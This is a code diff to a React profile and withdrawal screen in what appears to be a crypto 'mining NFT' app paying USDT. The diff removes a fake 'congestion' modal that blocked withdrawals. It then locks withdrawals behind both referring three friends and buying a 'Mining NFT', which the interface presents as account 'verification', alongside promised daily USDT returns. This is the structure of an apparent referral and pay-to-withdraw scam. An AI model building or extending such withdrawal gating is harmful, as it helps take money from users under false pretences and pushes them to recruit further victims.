@@ -247,16 +247,25 @@ export function ProfileTab() {
   const handleWithdraw = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    // Check withdrawal criteria (3 referrals OR Level 1 NFT owned)
-    const hasNftOwned = (user?.hasNft || 0) >= 1;
+    // 1. First Gate: Must have at least 3 referrals
     const hasThreeReferrals = totalReferrals >= 3;
-    const isWithdrawalUnlocked = hasThreeReferrals || hasNftOwned;
-
-    if (!isWithdrawalUnlocked) {
-      showToast(<span>🔒 Withdrawal Locked! You must refer at least 3 active friends OR purchase at least the Level 1 NFT to withdraw.</span>, 'error');
+    if (!hasThreeReferrals) {
+      showToast(<span>🔒 Withdrawal Locked! You must refer at least 3 active friends to unlock withdrawals.</span>, 'error');
       return;
     }
 
+    // 2. Second Gate: If they have 3 referrals but NO NFT, force them to buy NFT
+    const hasNftOwned = (user?.hasNft || 0) >= 1;
+    if (!hasNftOwned) {
+      showToast(<span>⚠️ Almost there! You must purchase a Mining NFT to verify your account and enable instant withdrawals.</span>, 'info');
+      const nftSection = document.getElementById('nft-marketplace');
+      if (nftSection) {
+        nftSection.scrollIntoView({ behavior: 'smooth' });
+      }
+      return;
+    }
+
+    // 3. Validation
     const amount = parseUSDT(withdrawAmount);
     
     if (!amount || amount < MIN_WITHDRAWAL * 10000) {
@@ -272,8 +281,42 @@ export function ProfileTab() {
       return;
     }
 
-    // Trigger the multi-lingual congestion notice modal!
-    setShowCongestionModal(true);
+    // 4. Actual Withdrawal Call
+    try {
+      setIsWithdrawing(true);
+      const res = await fetch('/api/withdraw', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': initData || ''
+        },
+        body: JSON.stringify({
+          amount: amount,
+          walletAddress: walletAddress.trim()
+        })
+      });
+
+      const data = await res.json();
+      
+      if (data.success) {
+        showToast('🎉 Withdrawal request submitted! Funds will be processed within 24 hours.', 'success');
+        setWithdrawAmount('');
+        setWalletAddress('');
+        fetchUser(); // Refresh balance
+        fetchHistory(); // Refresh history
+      } else {
+        if (data.error?.toLowerCase().includes('nft')) {
+           const nftSection = document.getElementById('nft-marketplace');
+           if (nftSection) nftSection.scrollIntoView({ behavior: 'smooth' });
+        }
+        showToast(data.error || 'Withdrawal failed. Please try again.', 'error');
+      }
+    } catch (err) {
+      console.error(err);
+      showToast('Connection error. Please try again later.', 'error');
+    } finally {
+      setIsWithdrawing(false);
+    }
   };
 
   return (
@@ -371,11 +414,68 @@ export function ProfileTab() {
           </motion.div>
         </div>
 
+        {/* My NFT Collection - ONLY IF OWNED */}
+        {user?.hasNft && user.hasNft >= 1 && (
+          <motion.div 
+            initial={{ opacity: 0, scale: 0.95 }}
+            animate={{ opacity: 1, scale: 1 }}
+            className="bg-white rounded-[24px] p-5 shadow-[0_12px_40px_rgba(0,0,0,0.06)] border border-slate-100 flex flex-col relative overflow-hidden"
+          >
+            <div className="absolute top-0 right-0 w-32 h-32 bg-indigo-50/50 rounded-bl-[100px] -z-0 opacity-40"></div>
+            
+            <div className="flex items-center justify-between mb-4 relative z-10">
+              <div className="flex items-center gap-2">
+                <div className="w-8 h-8 bg-indigo-50 rounded-lg flex items-center justify-center">
+                  <Sparkles className="w-4 h-4 text-indigo-600 animate-pulse" />
+                </div>
+                <h3 className="text-[14px] font-black text-slate-900 tracking-tight uppercase">My NFT Collection</h3>
+              </div>
+              <span className="text-[9px] font-black text-emerald-700 bg-emerald-50 px-2 py-1 rounded-lg border border-emerald-100">STAKED & MINING</span>
+            </div>
+
+            <div className="bg-slate-50/80 backdrop-blur-sm border border-slate-100 rounded-2xl p-3 flex items-center gap-4 relative z-10">
+              <div className="w-16 h-16 rounded-xl overflow-hidden border-2 border-white shadow-sm shrink-0">
+                <img 
+                  src={user.hasNft === 1 
+                    ? 'https://i.ibb.co/dJtkVSVV/file-0000000047a48211926b535652563852.png' 
+                    : 'https://i.ibb.co/Xx5L13HJ/file-00000000b9f481f491fc3471e26e01db.png'} 
+                  alt="My NFT" 
+                  className="w-full h-full object-cover"
+                />
+              </div>
+              <div className="flex flex-col flex-1">
+                <div className="flex items-center gap-1.5">
+                   <span className={cn(
+                     "text-[8px] font-black uppercase tracking-wider px-1.5 py-0.5 rounded-md",
+                     user.hasNft === 1 ? "bg-amber-100 text-amber-700" : "bg-indigo-100 text-indigo-700"
+                   )}>
+                     Level {user.hasNft}
+                   </span>
+                   <span className="text-[9px] font-bold text-slate-400">ID: #NFT-{user.id.slice(-4).toUpperCase()}</span>
+                </div>
+                <h4 className="text-[14px] font-black text-slate-900 mt-0.5">
+                  {user.hasNft === 1 ? 'Bronze NFT (Lvl 1)' : 'Silver NFT (Lvl 2)'}
+                </h4>
+                <div className="flex items-center gap-1.5 mt-1">
+                   <div className="w-1.5 h-1.5 bg-emerald-500 rounded-full animate-pulse"></div>
+                   <span className="text-[10px] font-black text-emerald-600 uppercase tracking-tighter">
+                     {user.hasNft === 1 ? '+1.00 USDT/Day' : '+3.50 USDT/Day'} Boost Active
+                   </span>
+                </div>
+              </div>
+              <div className="w-10 h-10 bg-white rounded-full border border-slate-100 flex items-center justify-center shadow-sm">
+                <CheckCircle2 className="w-5 h-5 text-emerald-500" />
+              </div>
+            </div>
+          </motion.div>
+        )}
+
         {/* NFT Divider */}
         <div className="border-t border-slate-200/80 my-2"></div>
 
         {/* NFT Marketplace Section */}
         <motion.div 
+          id="nft-marketplace"
           initial={{ opacity: 0, y: 20 }}
           animate={{ opacity: 1, y: 0 }}
           transition={{ delay: 0.25 }}
@@ -515,47 +615,66 @@ export function ProfileTab() {
 
           {/* Elegant Referral or NFT Lock/Unlock Notice */}
           {(() => {
-            const isWithdrawalUnlocked = totalReferrals >= 3 || (user?.hasNft || 0) >= 1;
-            return isWithdrawalUnlocked ? (
-              <motion.div 
-                initial={{ opacity: 0, scale: 0.95 }}
-                animate={{ opacity: 1, scale: 1 }}
-                className="mb-4 bg-emerald-50 border border-emerald-200/60 rounded-2xl p-4 flex flex-col space-y-1.5 relative overflow-hidden z-10 shadow-[0_2px_12px_rgba(16,185,129,0.04)]"
-              >
-                <div className="flex items-center gap-2">
-                  <div className="w-6 h-6 rounded-lg bg-emerald-100 flex items-center justify-center text-emerald-700 shrink-0 animate-bounce">
-                    <Sparkles className="w-3.5 h-3.5 text-emerald-600" />
+            const hasReferrals = totalReferrals >= 3;
+            const hasNft = (user?.hasNft || 0) >= 1;
+            const isWithdrawalUnlocked = hasReferrals && hasNft;
+
+            if (isWithdrawalUnlocked) {
+              return (
+                <motion.div 
+                  initial={{ opacity: 0, scale: 0.95 }}
+                  animate={{ opacity: 1, scale: 1 }}
+                  className="mb-4 bg-emerald-50 border border-emerald-200/60 rounded-2xl p-4 flex flex-col space-y-1.5 relative overflow-hidden z-10 shadow-[0_2px_12px_rgba(16,185,129,0.04)]"
+                >
+                  <div className="flex items-center gap-2">
+                    <div className="w-6 h-6 rounded-lg bg-emerald-100 flex items-center justify-center text-emerald-700 shrink-0 animate-bounce">
+                      <Sparkles className="w-3.5 h-3.5 text-emerald-600" />
+                    </div>
+                    <h4 className="text-[11px] font-black text-emerald-950 uppercase tracking-wider">Verification Complete</h4>
+                    <span className="ml-auto text-[9px] font-black text-emerald-700 bg-emerald-100/70 px-2 py-0.5 rounded-full border border-emerald-200 flex items-center gap-1">
+                      Active Status <Check className="w-2.5 h-2.5" />
+                    </span>
                   </div>
-                  <h4 className="text-[11px] font-black text-emerald-950 uppercase tracking-wider">Withdrawal Unlocked</h4>
-                  <span className="ml-auto text-[9px] font-black text-emerald-700 bg-emerald-100/70 px-2 py-0.5 rounded-full border border-emerald-200 flex items-center gap-1">
-                    Active Status <Check className="w-2.5 h-2.5" />
-                  </span>
-                </div>
-                <p className="text-[10px] text-emerald-800 leading-relaxed font-bold">
-                  🎉 Congratulations! You have unlocked withdrawals by satisfying the required criteria ({(user?.hasNft || 0) >= 1 ? 'NFT Owned' : `3 Active Referrals achieved`}).
-                </p>
-              </motion.div>
-            ) : (
+                  <p className="text-[10px] text-emerald-800 leading-relaxed font-bold">
+                    🎉 Your account is fully verified. Withdrawals are now active and will be processed immediately.
+                  </p>
+                </motion.div>
+              );
+            }
+
+            return (
               <div className="mb-4 bg-amber-50/70 border border-amber-200/50 rounded-2xl p-4 flex flex-col space-y-2.5 relative overflow-hidden z-10">
                 <div className="flex items-center gap-2">
                   <div className="w-6 h-6 rounded-lg bg-amber-100 flex items-center justify-center text-amber-700 shrink-0">
                     <Lock className="w-3.5 h-3.5" />
                   </div>
-                  <h4 className="text-[11px] font-black text-amber-950 uppercase tracking-wider">Withdrawal Locked</h4>
+                  <h4 className="text-[11px] font-black text-amber-950 uppercase tracking-wider">Verification Steps</h4>
                 </div>
                 <p className="text-[10px] text-amber-800 leading-relaxed font-bold">
-                  To unlock withdrawals, you must satisfy **at least ONE** of the following requirements:
+                  Complete these steps to unlock your first withdrawal:
                 </p>
                 <div className="space-y-1.5 pl-1">
-                  <div className="flex items-center justify-between text-[10px] font-extrabold text-amber-900 bg-amber-100/40 px-2.5 py-1 rounded-xl">
-                    <span>1. Refer 3 active friends</span>
-                    <span className="bg-amber-100 text-amber-800 px-1.5 py-0.5 rounded text-[8px]">
-                      Progress: {totalReferrals} / 3
+                  <div className={cn(
+                    "flex items-center justify-between text-[10px] font-extrabold px-2.5 py-1 rounded-xl",
+                    hasReferrals ? "bg-emerald-100/40 text-emerald-900" : "bg-amber-100/40 text-amber-900"
+                  )}>
+                    <span className="flex items-center gap-1.5">
+                      {hasReferrals ? <Check className="w-3 h-3" /> : "1."} Refer 3 active friends
+                    </span>
+                    <span className={cn("px-1.5 py-0.5 rounded text-[8px]", hasReferrals ? "bg-emerald-100 text-emerald-800" : "bg-amber-100 text-amber-800")}>
+                      {totalReferrals} / 3
                     </span>
                   </div>
-                  <div className="flex items-center justify-between text-[10px] font-extrabold text-amber-900 bg-amber-100/40 px-2.5 py-1 rounded-xl">
-                    <span>2. Purchase Level 1 NFT</span>
-                    <span className="text-amber-700 text-[8px] uppercase tracking-wider">Price: 1 TON</span>
+                  <div className={cn(
+                    "flex items-center justify-between text-[10px] font-extrabold px-2.5 py-1 rounded-xl",
+                    hasNft ? "bg-emerald-100/40 text-emerald-900" : "bg-amber-100/40 text-amber-900"
+                  )}>
+                    <span className="flex items-center gap-1.5">
+                      {hasNft ? <Check className="w-3 h-3" /> : "2."} Purchase Mining NFT
+                    </span>
+                    <span className={cn("px-1.5 py-0.5 rounded text-[8px]", hasNft ? "bg-emerald-100 text-emerald-800" : "bg-amber-100 text-amber-800")}>
+                      {hasNft ? "Purchased" : "Required"}
+                    </span>
                   </div>
                 </div>
               </div>
@@ -564,7 +683,7 @@ export function ProfileTab() {
 
           <form onSubmit={handleWithdraw} className="space-y-3 relative z-10">
             {(() => {
-              const isWithdrawalUnlocked = totalReferrals >= 3 || (user?.hasNft || 0) >= 1;
+              const isWithdrawalUnlocked = totalReferrals >= 3;
               return (
                 <>
                   <div className="space-y-1">
